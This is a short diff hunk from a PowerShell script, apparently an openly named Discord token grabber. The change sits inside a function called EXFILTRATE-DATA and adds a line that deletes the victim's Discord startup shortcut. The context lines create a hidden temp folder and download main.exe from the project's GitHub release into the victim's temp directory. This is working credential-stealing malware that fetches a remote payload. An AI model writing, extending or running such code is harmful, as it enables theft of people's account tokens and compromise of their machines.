@@ -448,6 +448,9 @@ function EXFILTRATE-DATA {
     if ($TEMP_KDOT -eq $false) {
         New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory
     }
+
+    #Disable system start discord on startup (The Program Automatically Restarts It)
+    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Discord Inc\Discord.lnk" -Force
     
     #Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe" -OutFile "main.exe" -UseBasicParsing
     (New-Object System.Net.WebClient).DownloadFile("https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
